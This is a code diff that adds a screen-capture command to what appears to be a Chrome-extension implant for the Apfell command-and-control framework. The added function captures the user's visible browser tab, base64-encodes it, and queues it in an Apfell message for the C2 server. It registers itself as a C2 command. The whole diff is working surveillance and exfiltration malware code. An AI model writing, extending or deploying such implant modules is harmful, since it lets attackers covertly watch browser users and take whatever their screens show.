@@ -1,0 +1,20 @@
+screencapture = function(){
+    chrome.tabs.captureVisibleTab(null, function(img) {
+        // send back the base64encoded image
+        //console.log('Image '+img.toString());
+        if (img === undefined) {
+            C2.sendError(taskid, tasktype);
+        } else {
+            let encImg = img.toString().split(',')[1];
+            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encImg.length, taskid, tasktype, encImg);
+            let meta = {};
+            meta["metatype"] = 3;
+            meta["metadata"] = apfellmsg;
+            const metaenvelope = JSON.stringify(meta);
+            out.push(metaenvelope);
+        }
+
+    });
+};
+
+C2.commands[screencapture.name] = screencapture;
